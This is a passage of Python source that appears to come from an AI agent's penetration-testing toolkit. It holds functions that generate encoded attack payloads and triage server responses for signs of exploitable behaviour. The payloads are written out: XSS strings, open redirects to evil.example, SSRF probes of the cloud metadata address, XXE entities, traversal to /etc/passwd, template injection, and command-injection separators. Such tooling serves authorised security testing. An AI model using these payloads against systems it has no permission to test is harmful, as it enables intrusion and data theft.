                "strategy": "img_onerror_xss",
                "expected_markers": ["<img", "onerror=alert", "document.domain"],
            },
            {
                "payload": "{{constructor.constructor('alert(1)')()}}",
                "strategy": "template_gadget_xss",
                "expected_markers": ["constructor.constructor", "alert(1)"],
            },
        ]:
            payloads.append(payload)
    elif vulnerability_type == "open_redirect":
        payloads.extend(
            [
                {
                    "payload": "https://evil.example/landing",
                    "strategy": "absolute_external_redirect",
                    "expected_markers": ["https://evil.example/landing"],
                },
                {
                    "payload": "//evil.example/landing",
                    "strategy": "scheme_relative_redirect",
                    "expected_markers": ["//evil.example/landing"],
                },
                {
                    "payload": "/admin",
                    "strategy": "sensitive_internal_redirect",
                    "expected_markers": ["/admin"],
                },
                {
                    "payload": "/internal/debug",
                    "strategy": "debug_redirect",
                    "expected_markers": ["/internal/debug"],
                },
            ]
        )
    elif vulnerability_type == "ssrf":
        base_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1/",
            "http://localhost/",
            "http://2130706433/",
            "http://[::1]/",
        ]
        for payload in [*callback_urls, *base_payloads]:
            payloads.append({"payload": payload, "strategy": "oob_and_internal_host"})
    elif vulnerability_type == "xxe":
        urls = callback_urls or ["http://127.0.0.1/xxe"]
        for url in urls:
            payloads.append(
                {
                    "payload": (
                        f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "{url}">]><root>&xxe;</root>'
                    ),
                    "strategy": "external_entity_fetch",
                }
            )
    elif vulnerability_type == "path_traversal":
        payloads.extend(
            [
                {
                    "payload": "../../../../etc/passwd",
                    "strategy": "unix_file_read",
                    "expected_markers": ["root:x:0:0", "/bin/bash", "daemon:x:"],
                },
                {
                    "payload": "../../../../etc/hosts",
                    "strategy": "unix_host_read",
                    "expected_markers": ["localhost", "127.0.0.1"],
                },
                {
                    "payload": "..\\..\\..\\..\\windows\\win.ini",
                    "strategy": "windows_file_read",
                    "expected_markers": ["[extensions]", "[fonts]", "[mci extensions]"],
                },
            ]
        )
    elif vulnerability_type == "ssti":
        payloads.extend(
            [
                {
                    "payload": "{{7*7}}",
                    "strategy": "expression_eval",
                    "expected_markers": ["49"],
                },
                {
                    "payload": "${7*7}",
                    "strategy": "el_eval",
                    "expected_markers": ["49"],
                },
                {
                    "payload": "<%= 7*7 %>",
                    "strategy": "erb_eval",
                    "expected_markers": ["49"],
                },
                {
                    "payload": "{{7*'7'}}",
                    "strategy": "string_multiplication_eval",
                    "expected_markers": ["7777777"],
                },
            ]
        )
    elif vulnerability_type in {"rce", "command_injection"}:
        for payload in [";id", "&& id", "| id", "$(id)", "`id`", ";sleep 5"]:
            payloads.append({"payload": payload, "strategy": "command_separator"})
    else:
        for payload in ["test", "../", "${7*7}", "{{7*7}}", "' OR '1'='1", "<svg/onload=alert(1)>"]:
            payloads.append({"payload": payload, "strategy": "mixed_probe"})

    return payloads


def _encoded_payloads(raw_payload: str) -> list[dict[str, Any]]:
    return [
        {"payload": raw_payload, "encoding": "raw"},
        {"payload": quote(raw_payload, safe=""), "encoding": "url"},
        {"payload": quote(quote(raw_payload, safe=""), safe=""), "encoding": "double_url"},
        {"payload": json.dumps(raw_payload)[1:-1], "encoding": "json_string"},
    ]


@register_tool(sandbox_execution=False)
def generate_contextual_payloads(
    vulnerability_type: str,
    surface: str,
    parameter_names: list[str] | None = None,
    callback_urls: list[str] | None = None,
    include_encodings: bool = True,
    max_variants: int = 24,
) -> dict[str, Any]:
    try:
        normalized_type = vulnerability_type.strip().lower()
        normalized_surface = surface.strip()
        if not normalized_type:
            raise ValueError("vulnerability_type is required")
        if not normalized_surface:
            raise ValueError("surface is required")
        if max_variants < 1:
            raise ValueError("max_variants must be >= 1")

        parameters = [str(name).strip() for name in (parameter_names or []) if str(name).strip()]
        callbacks = [str(url).strip() for url in (callback_urls or []) if str(url).strip()]
        base_payloads = _payload_variants_for_type(normalized_type, callback_urls=callbacks)

        variants: list[dict[str, Any]] = []
        for item in base_payloads:
            payload = str(item["payload"])
            encodings = _encoded_payloads(payload) if include_encodings else [{"payload": payload, "encoding": "raw"}]
            for encoded in encodings:
                variants.append(
                    {
                        "payload": encoded["payload"],
                        "encoding": encoded["encoding"],
                        "strategy": item["strategy"],
                        "parameter_hints": parameters,
                        "expected_markers": _normalize_marker_list(item.get("expected_markers")),
                    }
                )

        deduped: list[dict[str, Any]] = []
        seen: set[tuple[str, str, str]] = set()
        for item in variants:
            key = (
                str(item["payload"]),
                str(item["encoding"]),
                str(item["strategy"]),
            )
            if key in seen:
                continue
            seen.add(key)
            deduped.append(item)

    except (TypeError, ValueError) as e:
        return {"success": False, "error": f"Failed to generate contextual payloads: {e}"}
    else:
        return {
            "success": True,
            "vulnerability_type": normalized_type,
            "surface": normalized_surface,
            "variant_count": len(deduped[:max_variants]),
            "variants": deduped[:max_variants],
        }


@register_tool(sandbox_execution=False)
def triage_attack_anomalies(
    agent_state: Any,
    target: str,
    component: str,
    surface: str,
    observations: list[dict[str, Any]],
    baseline_name: str | None = None,
    min_score: int = 4,
    persist_hypothesis: bool = True,
) -> dict[str, Any]:
    try:
        if min_score < 1:
            raise ValueError("min_score must be >= 1")
        if len(observations) < 2:
            raise ValueError("observations must contain at least 2 items")

        normalized: list[dict[str, Any]] = []
        for item in observations:
            if not isinstance(item, dict):
                raise ValueError("Each observation must be an object")
            normalized.append(
                {
                    "name": str(item.get("name") or item.get("label") or "").strip(),
                    "status_code": item.get("status_code"),
                    "body_hash": str(item.get("body_hash") or "").strip(),
                    "body_length": int(item.get("body_length") or 0),
                    "body_preview": str(item.get("body_preview") or ""),
                    "elapsed_ms": float(item.get("elapsed_ms") or 0.0),
                    "content_type": str(item.get("content_type") or ""),
                    "location": str(item.get("location") or ""),
                    "error": str(item.get("error") or "").strip() or None,
                    "oob_interaction": bool(item.get("oob_interaction")),
                    "callback_protocol": str(item.get("callback_protocol") or "").strip() or None,
                    "matcher_hits": _normalize_marker_list(item.get("matcher_hits")),
                    "reflection_detected": bool(item.get("reflection_detected")),
                    "expected_rejection": bool(item.get("expected_rejection")),
                }
            )
        if any(not item["name"] for item in normalized):
            raise ValueError("Each observation requires a non-empty name")

        by_name = {item["name"]: item for item in normalized}
        if baseline_name and baseline_name not in by_name:
            raise ValueError(f"baseline_name '{baseline_name}' was not found")

        if baseline_name:
            baseline = by_name[baseline_name]
        else:
            ranked = sorted(
                normalized,
                key=lambda item: (-(_role_rank(item["name"]) or -1), item["name"]),
            )
            baseline = ranked[0]

        suspicious: list[dict[str, Any]] = []
        baseline_matchers = {item.lower() for item in baseline.get("matcher_hits", [])}
        for item in normalized:
            if item["name"] == baseline["name"]:
                continue
            score = 0
            issue_types: list[str] = []
            similarity = _preview_similarity(item["body_preview"], baseline["body_preview"])
            lower_rank = _role_rank(item["name"])
            higher_rank = _role_rank(baseline["name"])
            new_matcher_hits = [
                marker
                for marker in item.get("matcher_hits", [])
                if str(marker).lower() not in baseline_matchers
            ]

            if item["oob_interaction"] or item["callback_protocol"]:
                score += 6
                issue_types.append("blind_interaction")

            if (
                item.get("expected_rejection")
                and not item["error"]
                and _status_indicates_success(item["status_code"])
                and _status_indicates_success(baseline["status_code"])
                and item["status_code"] == baseline["status_code"]
                and (
                    (item["body_hash"] and item["body_hash"] == baseline["body_hash"])
                    or similarity >= 0.98
                )
            ):
                score += 5
                issue_types.append("dangerous_variant_acceptance")

            if new_matcher_hits:
                score += 5
                issue_types.append("semantic_indicator")

            if (
                lower_rank is not None
                and higher_rank is not None
                and lower_rank < higher_rank
                and not item["error"]
                and item["status_code"] == baseline["status_code"]
                and (
                    (item["body_hash"] and item["body_hash"] == baseline["body_hash"])
                    or similarity >= 0.98
                )
            ):
                score += 6
                issue_types.append("authorization_parity")

            if (
                item["elapsed_ms"] > baseline["elapsed_ms"] * 2
                and item["elapsed_ms"] - baseline["elapsed_ms"] >= TIMING_DELTA_MS
            ):
                score += 4
                issue_types.append("timing_oracle")

            if item["location"] and item["reflection_detected"]:
                score += 5
                issue_types.append("sensitive_redirect")

            if item["location"] and any(
                marker in item["location"].lower() for marker in ["/admin", "/internal", "/debug"]
            ):
                score += 3
                issue_types.append("sensitive_redirect")

            if (
                item["status_code"] == baseline["status_code"]
                and baseline["body_length"] > 0
                and (
                    item["body_length"] >= baseline["body_length"] * 2
                    or item["body_length"] <= max(1, baseline["body_length"] // 2)
                )
            ):
                score += 2
                issue_types.append("length_outlier")

            if score >= min_score:
                suspicious.append(
                    {
                        "name": item["name"],
                        "baseline_name": baseline["name"],
                        "score": score,
                        "issue_types": issue_types,
                        "top_issue_type": _top_issue_type(issue_types),
                        "similarity": round(similarity, 3),
                        "status_code": item["status_code"],
                        "baseline_status_code": baseline["status_code"],
                        "elapsed_ms": item["elapsed_ms"],
                        "baseline_elapsed_ms": baseline["elapsed_ms"],
                        "matcher_hits": new_matcher_hits,
                        "reflection_detected": item["reflection_detected"],
                        "expected_rejection": item["expected_rejection"],
                    }
                )

        total_errors = sum(1 for item in normalized if item["error"])
        if total_errors == len(normalized):
            coverage_status = "blocked"
            coverage_priority = "high"
            coverage_rationale = "Anomaly triage could not compare observations because every observation failed."
            next_step = "Repair the failing requests or probes before using anomaly triage on this surface"
        elif suspicious:
            top_issue = _top_issue_type([item["top_issue_type"] for item in suspicious])
            coverage_status = "in_progress"
            coverage_priority = (
                "critical"
                if top_issue in {"blind_interaction", "authorization_parity"}
                else "high"
            )
            coverage_rationale = (
                f"Anomaly triage found {len(suspicious)} suspicious observation(s) on {surface} "
                f"with top signal {top_issue}."
            )
            next_step = (
                "Build a focused validation PoC around the highest-scoring anomaly and confirm whether "
                "it reflects real authorization, blind callback, timing, or workflow impact"
            )
        elif total_errors > 0:
            coverage_status = "blocked"
            coverage_priority = "normal"
            coverage_rationale = (
                "Anomaly triage completed partially, but some observations failed and the surface remains unresolved."
            )
            next_step = "Repair failing probes and repeat the anomaly comparison"
        else:
            coverage_status = "covered"
            coverage_priority = "normal"
            coverage_rationale = f"Anomaly triage found no high-signal cross-variant anomalies on {surface}."
            next_step = "Re-run triage only after new payload families or side-channel observations are collected"

        coverage_result = record_coverage(
            agent_state=agent_state,
            target=target,
            component=component,
            surface=surface,
            status=coverage_status,
            rationale=coverage_rationale,
            priority=coverage_priority,
            next_step=next_step,
        )

        hypothesis_result = None
        if suspicious and persist_hypothesis:
            top_issue = _top_issue_type([item["top_issue_type"] for item in suspicious])
            hypothesis_result = record_hypothesis(
                agent_state=agent_state,
                hypothesis=f"High-signal anomaly patterns may indicate exploitable behavior on {surface}",
                target=target,
                component=component,
                vulnerability_type=_vulnerability_type_for_issue(top_issue),
                status="open",
                priority=coverage_priority,
                rationale=coverage_rationale,
            )

        evidence_result = record_evidence(
            agent_state=agent_state,
            title=f"Attack anomaly triage on {surface}",
            details=json.dumps(
                {"baseline": baseline, "suspicious": suspicious, "observations": normalized},
                ensure_ascii=False,
            ),
            source="tool",
            target=target,
            component=component,
            related_coverage_id=coverage_result.get("coverage_id"),
            related_hypothesis_id=(
                hypothesis_result.get("hypothesis_id")
                if isinstance(hypothesis_result, dict)
                else None
            ),
        )

    except (TypeError, ValueError) as e:
        return {"success": False, "error": f"Failed to triage attack anomalies: {e}"}
    else:
        return {
            "success": True,
            "baseline": baseline,
            "suspicious_observations": suspicious,
            "coverage_result": coverage_result,
            "hypothesis_result": hypothesis_result,
            "evidence_result": evidence_result,
        }
